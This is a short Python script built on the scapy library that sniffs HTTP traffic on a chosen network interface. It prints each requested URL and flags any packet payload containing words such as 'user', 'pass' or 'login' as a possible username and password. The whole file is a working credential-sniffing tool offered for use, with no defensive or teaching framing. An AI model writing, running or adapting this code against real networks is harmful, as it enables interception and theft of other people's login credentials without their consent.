#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify the interface to capture packets")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80 or port 443")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode("utf-8")
        keywords = ['login', 'LOGIN', 'user', 'pass', 'username', 'password', 'Login']

        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet).decode('utf-8')  # Decode the URL bytes to a string
        print("[+] HTTP Request > " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username and password: " + login_info + "\n\n")

def main():
    options = get_arguments()
    sniff(options.interface)

if __name__ == "__main__":
    main()
